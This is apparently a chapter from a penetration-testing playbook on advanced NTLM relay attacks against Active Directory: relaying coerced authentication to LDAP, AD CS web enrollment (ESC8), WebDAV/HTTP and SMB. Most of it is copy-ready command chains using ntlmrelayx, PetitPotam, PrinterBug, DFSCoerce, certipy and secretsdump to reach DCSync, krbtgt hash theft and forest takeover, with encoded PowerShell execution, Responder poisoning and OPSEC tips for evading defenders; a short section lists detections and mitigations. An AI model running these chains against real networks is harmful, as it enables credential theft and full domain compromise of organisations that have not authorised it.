---
title: "23 · NTLM Relay Advanced"
---

# 23 · NTLM Relay Advanced

> Relay to LDAP, ADCS, and over WebDAV/HTTP to bypass SMB signing.

!!! note "Phase overview"
    Coercion gives you the auth; the relay target determines the prize. Relay to LDAP to add a computer or grant DCSync. Relay to ADCS HTTP enrollment for a machine cert (ESC8). Relay over HTTP via WebClient when SMB signing is enforced; HTTP doesn't require signing.

!!! tip "Mental model: coercion + relay = identity laundering"
    You're never authenticating as anyone. You're convincing a victim to authenticate to **you**, then forwarding that auth to a service that trusts the victim. Two independent moving parts:

    - **Coercion primitive** (how you trigger the victim into authenticating): PetitPotam (MS-EFSR), PrinterBug (MS-RPRN), DFSCoerce (MS-DFSNM), ShadowCoerce (MS-FSRVP), WebClient UNC (HTTP), authenticated coercion via Coercer
    - **Relay target** (what you do with the auth): LDAP/LDAPS, SMB, HTTP/ADCS, IMAP, MSSQL

    Pick the right pair for the SMB-signing / channel-binding posture in front of you.

!!! warning "Signing posture matrix (memorize this)"
    | Service | Signing default | Required? | Relay viable? |
    |---|---|---|---|
    | SMB to DC | Required | Yes (always) | No |
    | SMB to workstation | Negotiated | No (default) | **Yes** |
    | SMB to server | Negotiated | No (default) | **Yes** |
    | LDAP | Negotiated | Often No | **Yes (most environments)** |
    | LDAPS | Channel binding optional | Often No | **Yes (most environments)** |
    | HTTP (ADCS, WSMan) | None | Never | **Always yes** |

    If LDAP signing is required AND channel binding is enforced on LDAPS, you cannot relay to either. HTTP-based targets (ADCS web enrollment, WSMan) never require signing — that's the WebDAV/ESC8 escape hatch.

### 23.1 · NTLM Relay to LDAP (Add Computer / DCSync / RBCD)

!!! info "Why this works / how it chains"

    Relay any user auth to LDAP. `--add-computer` creates a new computer object you control (since MAQ defaults to 10). `--escalate-user` grants DCSync rights to the named user. Both require LDAP signing/channel-binding to be unconfigured.

    Important nuance: **the relayed identity has to have the right to perform the action you're asking LDAP to do.** A relayed low-priv user can `--add-computer` (default MAQ), but `--escalate-user` needs the relayed account to have `WriteDACL` on the domain object (typically only DA, EA, or members of `Administrators`). For grunt-priv relays, `--add-computer` and RBCD via `--delegate-access` are the realistic outcomes.

!!! warning "What leads here"
    - LDAP signing not required (default in most domains pre-2025 hardening)
    - LDAPS channel binding not enforced (`EPA = None` or `Negotiated`)
    - Coercion target authenticates as a **machine account** (machine accounts can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on themselves → RBCD)
    - For DCSync escalation: relay must hit a privileged user (DA-equivalent)

```bash title="ntlmrelayx LDAP modes"
# Relay to LDAP → add new computer or grant DCSync
impacket-ntlmrelayx \
  -t ldap://<DC_IP> \
  -smb2support \
  --add-computer \
  --escalate-user youruser

# Relay to LDAPS
impacket-ntlmrelayx \
  -t ldaps://<DC_IP> \
  -smb2support \
  --delegate-access  # configure RBCD on coerced machine
```

```bash title="LDAP relay variations worth knowing"
# Multiple targets, round-robin (try each until one accepts)
impacket-ntlmrelayx -tf targets.txt -smb2support --add-computer

# Add computer with chosen name + password (default: random)
impacket-ntlmrelayx -t ldap://<DC_IP> -smb2support \
  --add-computer 'EVILPC$' --escalate-user attacker

# Just dump LDAP info as the relayed user (no modifications, recon-only)
impacket-ntlmrelayx -t ldap://<DC_IP> -smb2support \
  --dump-laps --dump-gmsa --dump-adcs

# Relay only one connection, then exit (clean for OPSEC)
impacket-ntlmrelayx -t ldap://<DC_IP> -smb2support \
  --add-computer --no-multirelay

# Specify the SMB relay listener interface (avoid binding 0.0.0.0)
impacket-ntlmrelayx -t ldap://<DC_IP> -smb2support \
  --interface-ip <ATTACKER_IP> --add-computer

# Relay through SOCKS so other tools can use the auth context
impacket-ntlmrelayx -t ldap://<DC_IP> -smb2support -socks
# Then in another shell:
proxychains4 -q impacket-secretsdump -no-pass <DOMAIN>/<RELAYED_USER>@<DC_IP>
```

!!! example "Chain A: low-priv coerce → relay to LDAP → RBCD → DA"
    ```bash
    # Goal: compromise WS01 from a foothold where SMB signing is disabled on WS01
    # (signing is enforced on DCs but NOT enforced on most workstations by default)

    # 1) Start relay to LDAPS, requesting RBCD on whoever connects
    impacket-ntlmrelayx -t ldaps://dc.domain.local -smb2support \
      --delegate-access --no-multirelay

    # 2) Coerce WS01's machine account to authenticate to us
    impacket-PetitPotam <ATTACKER_IP> ws01.domain.local
    # or
    impacket-printerbug 'domain.local/lowpriv:pass@ws01.domain.local' <ATTACKER_IP>

    # 3) ntlmrelayx output now shows: created EVILPC$ + wrote RBCD on WS01$
    #    "Delegation rights modified successfully! evilpc$ can now impersonate users"

    # 4) S4U2Self + S4U2Proxy as Administrator → cifs/ws01
    impacket-getST -spn cifs/ws01.domain.local \
      -impersonate Administrator \
      -dc-ip <DC_IP> \
      domain.local/'evilpc$':'<EVILPC_PASS>'

    # 5) Use the ticket
    export KRB5CCNAME=Administrator@cifs_ws01.domain.local@DOMAIN.LOCAL.ccache
    impacket-secretsdump -k -no-pass ws01.domain.local
    impacket-psexec -k -no-pass ws01.domain.local

    # 6) Cleanup (after engagement)
    bloodyAD remove rbcd 'ws01$' 'evilpc$'
    bloodyAD remove object 'CN=evilpc,CN=Computers,DC=domain,DC=local'
    ```

!!! example "Chain B: relay DA-equivalent auth → DCSync rights"
    ```bash
    # Requires the relayed identity to have WriteDACL on the domain object.
    # Practical scenario: forced auth from a Domain Admin's session.

    # 1) Listener
    impacket-ntlmrelayx -t ldap://dc.domain.local -smb2support \
      --escalate-user attacker --no-multirelay

    # 2) Trigger DA auth somehow (admin clicks a UNC, hits a poisoned share, etc.)

    # 3) ntlmrelayx output: "User attacker now has DCSync rights"

    # 4) DCSync
    impacket-secretsdump -just-dc-user krbtgt \
      domain.local/attacker:pass@dc.domain.local

    # 5) Cleanup
    bloodyAD remove dcsync attacker
    ```

!!! danger "Detection / OPSEC"
    - LDAP `add` of a new `computer` object from an unusual source IP is a 4741 event with conspicuous attributes (random hostname, no SPNs initially)
    - `msDS-AllowedToActOnBehalfOfOtherIdentity` writes to a computer object are very high-signal — defenders watch this attribute closely
    - Use `--no-multirelay` to avoid hammering the DC with N relayed sessions
    - Rotate attacker IPs / use legit-looking hostnames for `--add-computer NAME` (match domain naming convention)

### 23.2 · NTLM Relay to ADCS (ESC8)

!!! info "Why this works / how it chains"

    Already covered in Phase 5 ESC8: repeated here in the relay context. Relay machine account auth to `/certsrv` → DC machine cert → DCSync.

    AD CS HTTP/HTTPS web enrollment endpoints accept NTLM auth and **never** require channel binding by default (until the May 2022 hardening, and even then only with `EPA` enabled). A relayed DC machine account can request a cert from the `DomainController` template, giving you a cert with the DC's identity. From there: PKINIT to a TGT, UnPAC the NT hash, DCSync. Forest takeover from one coerced DC.

!!! warning "What leads here / prerequisites"
    - AD CS is installed with **Web Enrollment** role enabled (`/certsrv` reachable)
    - Web Enrollment vhost accepts NTLM (default) and EPA is not strictly required (default until May 2022 KB5005413; many envs still vulnerable)
    - You can coerce a Tier-0 machine (DC, ADCS server, or other privileged box) into authenticating to you
    - Templates available: `DomainController`, `Machine`, `KerberosAuthentication`, `DomainControllerAuthentication`

```bash title="Relay → cert → DCSync"
impacket-ntlmrelayx \
  -t http://<CA_IP>/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController

PetitPotam.py <ATTACKER_IP> <DC_IP>
printerbug.py domain.local/user:pass@<DC_IP> <ATTACKER_IP>

certipy auth -pfx dc.pfx -dc-ip <DC_IP>

impacket-secretsdump -hashes :<DC_HASH> \
  domain.local/'DC$'@<DC_IP>
```

```bash title="ESC8 variations and template choices"
# HTTPS endpoint (when /certsrv is HTTPS-only)
impacket-ntlmrelayx \
  -t https://<CA_IP>/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Modern endpoint name (Server 2019+ uses /certsrv too, but the exact ASP file may differ)
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp ...

# Different templates by relayed identity:
#   Machine account from DC → DomainController, DomainControllerAuthentication, KerberosAuthentication
#   Machine account from server → Machine, Computer
#   User account → User, ClientAuth (rarely useful unless target is high-priv)

# Using certipy as a fully-integrated alternative to ntlmrelayx
certipy relay -target http://<CA_IP> -template DomainController
# Then trigger coercion separately

# Once you have the PFX:
certipy auth -pfx dc.pfx -dc-ip <DC_IP>
# → outputs TGT and NT hash via UnPAC-the-hash

# DCSync with the recovered hash
impacket-secretsdump -just-dc \
  -hashes :<DC_NT_HASH> \
  domain.local/'DC$'@<DC_IP>
```

!!! example "Full ESC8 chain: zero creds to forest root"
    ```bash
    # Starting position: unauthenticated network access, target = DC, ADCS server discovered

    # 1) Confirm ADCS web enrollment is reachable
    curl -I http://adcs.domain.local/certsrv/certfnsh.asp
    # 401 with "WWW-Authenticate: NTLM" → vulnerable

    # 2) Start ntlmrelayx targeting ADCS, requesting a DC template cert
    impacket-ntlmrelayx \
      -t http://adcs.domain.local/certsrv/certfnsh.asp \
      -smb2support --adcs --template DomainController \
      --no-multirelay

    # 3) Coerce DC machine auth (PetitPotam pre-patched, or anonymous PetitPotam works)
    #    Anonymous PetitPotam (CVE-2021-36942) — no creds needed:
    impacket-PetitPotam -u '' -p '' <ATTACKER_IP> dc.domain.local

    #    If patched, try DFSCoerce:
    impacket-dfscoerce -u lowpriv -p pass <ATTACKER_IP> dc.domain.local

    #    Or PrinterBug if Print Spooler is up:
    impacket-printerbug 'domain.local/lowpriv:pass@dc.domain.local' <ATTACKER_IP>

    # 4) ntlmrelayx output: base64 PFX, save it
    #    "Successfully requested certificate for DC$"
    #    Base64 PFX → decode to dc.pfx

    # 5) Use the cert to PKINIT and recover the DC's NT hash
    certipy auth -pfx dc.pfx -dc-ip <DC_IP>
    # → got TGT, got NT hash for DC$

    # 6) DCSync with DC$ machine account
    impacket-secretsdump -just-dc \
      -hashes :<DC_NT_HASH> \
      domain.local/'DC$'@<DC_IP>
    # → krbtgt hash → Golden Ticket → forest dominance

    # 7) Cleanup (revoke cert if you have CA admin, otherwise note it for the report)
    ```

!!! tip "Anonymous PetitPotam / unauthenticated coercion"
    `PetitPotam.py -u '' -p '' <listener> <DC>` works against unpatched DCs (KB5005413, May 2022). DFSCoerce is patched separately. ShadowCoerce too. Always try the unauth versions first — they leave no creds in logs.

!!! danger "Detection / OPSEC"
    - Cert issuance from a `DomainController` template to a DC's own machine account looks legitimate at first glance, but the **request source IP** is the relay (your box), not the DC itself. Defenders correlating issued-cert source IPs catch this fast
    - PetitPotam/PrinterBug/DFSCoerce all generate distinctive RPC traffic. Defender for Identity has signatures for them
    - 4886/4887 events on the CA log every cert issuance — leaves a permanent paper trail
    - Consider revoking the cert post-engagement (CRL update) if you have CA admin rights; otherwise document it in the report

### 23.3 · WebDAV + Coercion (NTLM via HTTP)

!!! info "Why this works / how it chains"

    WebClient turns any UNC path with `@port` into an HTTP request. Coerce a target into hitting `attacker@8080` and the auth comes over HTTP, not SMB; bypassing the signing requirement. Then relay to LDAPS for `--delegate-access` (RBCD on the coerced machine).

    Mechanic: the Windows WebClient service translates `\\host@port\path` UNC syntax into an HTTP `PROPFIND` to `http://host:port/path`. That HTTP request carries NTLM auth in the `Authorization` header. HTTP doesn't sign or channel-bind by default, so relaying it to LDAPS works even when SMB signing is mandated everywhere.

!!! warning "What leads here"
    - SMB signing is enforced (relay to SMB blocked)
    - WebClient service running on a target (Win10 default — but **service is "manual start, triggered by login"**, often dormant on servers)
    - HTTP doesn't require signing: perfect bypass
    - You need the target's **FQDN** (not IP) for the WebDAV trigger to work in many cases — Windows resolves the hostname before deciding to use WebClient

!!! tip "Forcing WebClient to start"
    On servers where WebClient is installed but stopped, you can wake it. Any user-context process that touches a `searchconnector-ms` file or a UNC with `@` will auto-start the service:
    ```cmd
    rem From a low-priv shell on the target
    pushd \\live.sysinternals.com@SSL@443\tools
    rem or
    rundll32 davclnt.dll,DavSetCookie http://attacker:8080/ <cookie>
    ```

```bash title="WebDAV coercion → LDAPS RBCD"
# Check if WebClient service running on target
nxc smb <TARGET_IP> -u user -p pass -M webdav

# Setup responder/relay on HTTP
impacket-ntlmrelayx \
  -t ldaps://<DC_IP> \
  -smb2support \
  --delegate-access

# Trigger coercion via WebDAV UNC
# \\attacker@8080\share triggers HTTP auth not SMB
printerbug.py domain.local/user:pass@<TARGET_IP> \
  '<ATTACKER_IP>@8080/whatever'

# Start WebDAV listener
python3 -m http.server 8080
```

```bash title="WebClient detection + activation"
# nxc / netexec WebDAV check across the subnet
nxc smb <SUBNET>/24 -u user -p pass -M webdav
# Outputs hosts where WebClient is RUNNING (not just installed)

# Manual check (Windows cmd, low-priv)
sc query WebClient
# STATE: 4 RUNNING — relayable now
# STATE: 1 STOPPED — installed but inactive

# Cross-protocol coercion variations sending HTTP instead of SMB:
# DFSCoerce + WebDAV target syntax
impacket-dfscoerce -u user -p pass \
  '<ATTACKER_IP>@8080/share' <TARGET_IP>

# PrinterBug to WebDAV listener
impacket-printerbug 'domain.local/user:pass@<TARGET_IP>' \
  '<ATTACKER_IP>@8080/share'

# Coercer auto-tries every coercion primitive
Coercer.py coerce -u user -p pass \
  -l '<ATTACKER_IP>@8080/share' -t <TARGET_IP>
```

!!! example "Full chain: hardened SMB → WebDAV → RBCD → DA on workstation"
    ```bash
    # Scenario: SMB signing is enforced everywhere. Standard NTLM relay to SMB
    # is dead. But WebClient is up on WS01.

    # 1) Confirm WebClient is running on WS01
    nxc smb ws01.domain.local -u lowpriv -p pass -M webdav
    # → "WebClient Service is running"

    # 2) Find WS01's FQDN (must be FQDN for WebDAV to trigger)
    nslookup ws01.domain.local

    # 3) Listener: HTTP-fronted relay to LDAPS, configure RBCD on whoever lands
    impacket-ntlmrelayx \
      -t ldaps://dc.domain.local -smb2support \
      --delegate-access --no-multirelay \
      --http-port 8080

    # 4) Coerce WS01's machine account into hitting our WebDAV (NOT SMB)
    impacket-printerbug 'domain.local/lowpriv:pass@ws01.domain.local' \
      'attacker.domain.local@8080/share'
    #   Note: attacker hostname here must resolve in the victim's DNS.
    #         Plant an ADIDNS record if needed:
    #         bloodyAD add dnsRecord attacker <ATTACKER_IP>

    # 5) ntlmrelayx output: created EVILPC$, wrote RBCD on WS01$
    # 6-8) Same as Chain A in #23.1: getST → ticket → psexec / secretsdump

    # Cleanup: remove the ADIDNS record you planted, remove RBCD, delete EVILPC$
    bloodyAD remove dnsRecord attacker <ATTACKER_IP>
    bloodyAD remove rbcd 'ws01$' 'evilpc$'
    bloodyAD remove object 'CN=evilpc,CN=Computers,DC=domain,DC=local'
    ```

!!! warning "Why your WebDAV trigger isn't firing"
    Common pitfalls when WebDAV coercion fails:

    1. **Using IP, not FQDN**: Windows decides "is this a WebDAV URL?" partly based on hostname format. IPs often don't trigger WebClient
    2. **No DNS for attacker host**: target can't resolve `attacker.domain.local` → fall back to SMB → blocked by signing. Plant an ADIDNS record (Authenticated Users can by default)
    3. **WebClient service stopped**: it's installed but only auto-starts in user context. Server SKUs often have it disabled entirely
    4. **Port is blocked outbound**: target firewall may permit 445/SMB but not 8080. Try 80, 443, 8000
    5. **Wrong port syntax**: it's `@8080`, not `:8080`. The `@` is what flips the resolver into WebDAV mode

### 23.4 · Relay to SMB (still useful when signing isn't mandatory)

!!! info "Why this works / how it chains"

    When SMB signing is **not required** on the target (workstation defaults, many member servers), you can relay SMB-to-SMB and execute commands, dump SAM, or pull files as the relayed user. Less glamorous than LDAP/ADCS but often the path of least resistance for lateral movement.

!!! warning "What leads here"
    - Target SMB server has signing **negotiated** (not required)
    - Relayed user has admin rights on the target (otherwise you just get a session you can't do anything with)
    - Confirmed via: `nxc smb <subnet>/24 --gen-relay-list relayable.txt`

```bash title="SMB relay essentials"
# Generate a list of relayable targets (signing not required)
nxc smb 10.10.10.0/24 --gen-relay-list relayable.txt

# Relay SMB → SMB, execute command on the target
impacket-ntlmrelayx \
  -tf relayable.txt -smb2support \
  -c 'powershell -enc <BASE64_PAYLOAD>'

# Relay SMB → SMB, dump SAM on the target
impacket-ntlmrelayx -tf relayable.txt -smb2support

# Relay + SOCKS for arbitrary post-relay tooling
impacket-ntlmrelayx -tf relayable.txt -smb2support -socks
# Then:
proxychains4 -q impacket-secretsdump -no-pass <DOMAIN>/<USER>@<TARGET>
proxychains4 -q impacket-smbclient    -no-pass <DOMAIN>/<USER>@<TARGET>

# Specific share / file dump
impacket-ntlmrelayx -tf relayable.txt -smb2support \
  --enum-local-admins
```

!!! tip "Multirelay vs single-relay"
    By default ntlmrelayx will keep a session open and relay multiple times. For OPSEC and reproducibility, prefer `--no-multirelay` (one shot, exit) when you know exactly which auth you want to use. For SOCKS-mode harvesting (collect lots of sessions, use them ad hoc), keep multirelay enabled.

### 23.5 · Coercion primitives reference

!!! info "Pick the coercion that fits the patch level + creds you have"

    | Primitive | RPC interface | Auth required | Notable patches |
    |---|---|---|---|
    | PetitPotam | MS-EFSR (`EfsRpcOpenFileRaw`, `EfsRpcEncryptFileSrv`, etc.) | None (CVE-2021-36942, anonymous) OR domain user | KB5005413 (May 2022) blocks anonymous on most functions; some still work auth'd |
    | PrinterBug / SpoolSample | MS-RPRN (`RpcRemoteFindFirstPrinterChangeNotificationEx`) | Domain user | Mitigated by disabling Print Spooler on DCs (PrintNightmare aftermath). Often disabled now. |
    | DFSCoerce | MS-DFSNM (`NetrDfsRemoveStdRoot`) | Domain user | Patched in June 2022 KB5014754 — but only on DCs. Member servers still vulnerable. |
    | ShadowCoerce | MS-FSRVP (`IsPathSupported`) | Domain user | KB5015527 (July 2022). Requires File Server VSS Agent service. |
    | Coercer (auto) | All of the above + more | Varies | Covers MS-EVEN, MS-RRP, MS-WKST, etc. |
    | WebClient UNC | HTTP via WebClient service | Domain user | Not patched (it's a feature). Mitigation = disable WebClient. |

```bash title="Coercion command reference"
# PetitPotam (anonymous, when patches missing)
impacket-PetitPotam -u '' -p '' <ATTACKER_IP> <TARGET_IP>

# PetitPotam (authenticated)
impacket-PetitPotam -u user -p pass -d domain.local <ATTACKER_IP> <TARGET_IP>

# PrinterBug (Spooler must be running)
impacket-printerbug 'domain.local/user:pass@<TARGET_IP>' <ATTACKER_IP>

# Check Spooler status first
rpcdump.py @<TARGET_IP> | grep -i spool

# DFSCoerce
impacket-dfscoerce -u user -p pass -d domain.local <ATTACKER_IP> <TARGET_IP>

# ShadowCoerce
python3 ShadowCoerce.py -u user -p pass -d domain.local <ATTACKER_IP> <TARGET_IP>

# Coercer (run all viable methods automatically)
Coercer.py scan  -u user -p pass -d domain.local -t <TARGET_IP>     # what's exploitable
Coercer.py coerce -u user -p pass -d domain.local -l <ATTACKER_IP> -t <TARGET_IP>

# WebDAV-style trigger via any of the above
impacket-printerbug 'domain.local/user:pass@<TARGET_IP>' \
  '<ATTACKER_FQDN>@8080/x'
```

### 23.6 · End-to-end worked chains (the "show, don't tell" section)

!!! example "Chain 1: Workstation foothold → DC takeover (PetitPotam → ESC8)"
    ```bash
    # Position: shell on a workstation as a low-priv domain user.
    # Target: domain dominance via ADCS.

    # 1) Discover ADCS host
    certipy find -u lowpriv -p pass -dc-ip <DC_IP>
    # → CA = adcs.domain.local, vuln = ESC8 (web enrollment, no EPA)

    # 2) Plant ADIDNS for the listener (avoids cleartext IP in coercion args)
    bloodyAD add dnsRecord attacker <ATTACKER_IP>

    # 3) Listener
    impacket-ntlmrelayx \
      -t http://adcs.domain.local/certsrv/certfnsh.asp \
      -smb2support --adcs --template DomainController \
      --no-multirelay

    # 4) Coerce the DC
    impacket-PetitPotam -u lowpriv -p pass <ATTACKER_FQDN> dc.domain.local

    # 5) ntlmrelayx prints PFX → certipy auth → DC$ NT hash
    certipy auth -pfx dc.pfx -dc-ip <DC_IP>

    # 6) DCSync krbtgt
    impacket-secretsdump -just-dc-user krbtgt \
      -hashes :<DC_HASH> domain.local/'DC$'@<DC_IP>

    # 7) Golden ticket → forest dominance (see #13.2)

    # 8) Cleanup
    bloodyAD remove dnsRecord attacker <ATTACKER_IP>
    ```

!!! example "Chain 2: SMB-signed everything → WebDAV bypass → RBCD → SYSTEM"
    ```bash
    # Position: low-priv user, SMB signing required everywhere, ADCS not present
    # or hardened. Need an alternative path.

    # 1) Find a host with WebClient running (not just installed)
    nxc smb 10.10.10.0/24 -u lowpriv -p pass -M webdav
    # → ws05.domain.local: WebClient running

    # 2) Plant ADIDNS for our HTTP listener hostname
    bloodyAD add dnsRecord evilrelay <ATTACKER_IP>

    # 3) Listener: HTTP front, LDAPS back, configure RBCD
    impacket-ntlmrelayx -t ldaps://dc.domain.local -smb2support \
      --delegate-access --no-multirelay --http-port 8080

    # 4) Coerce ws05's machine account into HTTP auth via WebDAV
    impacket-printerbug 'domain.local/lowpriv:pass@ws05.domain.local' \
      'evilrelay.domain.local@8080/x'

    # 5) ntlmrelayx output: EVILPC$ created, RBCD configured on WS05$
    # 6) S4U to Administrator
    impacket-getST -spn cifs/ws05.domain.local \
      -impersonate Administrator -dc-ip <DC_IP> \
      domain.local/'evilpc$':'<EVILPC_PASS>'

    # 7) SYSTEM on ws05
    export KRB5CCNAME=Administrator@cifs_ws05.domain.local@DOMAIN.LOCAL.ccache
    impacket-psexec -k -no-pass ws05.domain.local

    # 8) Cleanup
    bloodyAD remove dnsRecord evilrelay <ATTACKER_IP>
    bloodyAD remove rbcd 'ws05$' 'evilpc$'
    bloodyAD remove object 'CN=evilpc,CN=Computers,DC=domain,DC=local'
    ```

!!! example "Chain 3: SOCKS-mode harvesting (use one auth N times)"
    ```bash
    # Goal: passively collect every NTLM auth on the wire, use them later.

    # 1) Spin up Responder for poisoning + ntlmrelayx for harvesting
    #    Disable Responder's SMB/HTTP servers since ntlmrelayx will own those
    sed -i 's/SMB = On/SMB = Off/'   /etc/responder/Responder.conf
    sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
    sudo responder -I eth0 -wd

    # 2) Multi-target relay with SOCKS
    impacket-ntlmrelayx -tf relayable.txt -smb2support -socks

    # 3) As authentications come in, ntlmrelayx logs each session:
    #    [*] SOCKS: Adding domain.local/SVCACCT@10.10.10.5(445) to active SOCKS connections.
    #    [*] SOCKS: Adding domain.local/HELPDESK@10.10.10.20(445) to active SOCKS connections.

    # 4) Use them ad hoc through proxychains
    proxychains4 -q impacket-secretsdump -no-pass domain.local/[email protected]
    proxychains4 -q impacket-smbclient   -no-pass domain.local/[email protected]
    proxychains4 -q evil-winrm -i 10.10.10.5 -u SVCACCT -p invalid
    #   (proxychains makes the auth go through the harvested session, password is ignored)

    # 5) List active SOCKS sessions any time
    socks
    ```

### 23.7 · Detection, OPSEC, defenses

!!! danger "What defenders see"
    - **4624 (logon)** with `Authentication Package = NTLM` to the relay target — but with the **source IP of the attacker**, not the legitimate workstation. Strong correlation signal.
    - **4768/4769** are absent (NTLM, not Kerberos) — anomaly when the rest of the environment is Kerberos-dominant
    - **5145 (file share access)** spikes from one source to many destinations — relay scanning signature
    - **4742 (computer account modified)** for `msDS-AllowedToActOnBehalfOfOtherIdentity` writes — RBCD configuration is loud
    - **4886/4887 (cert request/issue)** for ADCS relays
    - **Microsoft Defender for Identity** has dedicated detections for "Suspected NTLM relay attack" and "Resource based constrained delegation suspicious activity"

!!! tip "OPSEC playbook for relay engagements"
    - Use `--no-multirelay` whenever you have one specific outcome in mind (one auth, one action, exit)
    - Match the attacker hostname to the domain naming convention (`SVR-FILES-04` not `kalibox`)
    - Plant ADIDNS records via `bloodyAD add dnsRecord` so DNS for your listener resolves cleanly
    - Always plan and execute cleanup: remove RBCD, remove created computer accounts, remove ADIDNS records, document any issued certs
    - Prefer SOCKS-mode harvesting over active coercion when you can wait — passive collection draws less attention than RPC coercion bursts

!!! tip "Defenses to recommend in the report"
    - **Enable LDAP signing required + LDAPS channel binding (EPA)** on all DCs (`LDAPServerIntegrity = 2`, `LdapEnforceChannelBinding = 2`)
    - **Enforce SMB signing everywhere**, not just on DCs (`RequireSecuritySignature = 1` via GPO)
    - **Disable WebClient service** on workstations and servers that don't need WebDAV (`Set-Service WebClient -StartupType Disabled`)
    - **Patch ADCS web enrollment**: enable EPA on `/certsrv` (`HKLM\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Extended Protection`), or disable HTTP entirely and require HTTPS
    - **Disable NTLM** where possible (`RestrictNTLM` GPOs), or at minimum audit it
    - **Restrict machine account creation**: set `ms-DS-MachineAccountQuota = 0` so authenticated users can't `--add-computer`
    - **Disable Print Spooler on all servers** that aren't print servers (kills PrinterBug)
    - **Apply KB5005413, KB5014754, KB5015527** for PetitPotam, DFSCoerce, ShadowCoerce respectively

### 23.8 · Quick-reference decision tree

!!! tip "Pick your relay target in 10 seconds"
    ```
    Can you coerce a Tier-0 (DC, ADCS) machine?
    │
    ├── Yes → Is ADCS web enrollment exposed?
    │         │
    │         ├── Yes → Relay to ADCS (#23.2). DCSync. Forest takeover.
    │         │
    │         └── No  → Is LDAP signing not required?
    │                   ├── Yes → Relay to LDAP --escalate-user (#23.1)
    │                   └── No  → Try DFSCoerce + relay to LDAPS (channel binding often unset)
    │
    └── No (only workstation/member-server coercion) →
              Is SMB signing required on the target?
              │
              ├── No  → Relay SMB → SMB (#23.4) for code exec
              │
              └── Yes → Is WebClient running on any reachable host?
                        ├── Yes → WebDAV coerce → relay to LDAPS --delegate-access (#23.3)
                        └── No  → Look for ADCS regardless; other unprotected HTTP NTLM
                                  endpoints (Exchange OWA/EWS, internal IIS apps)
    ```

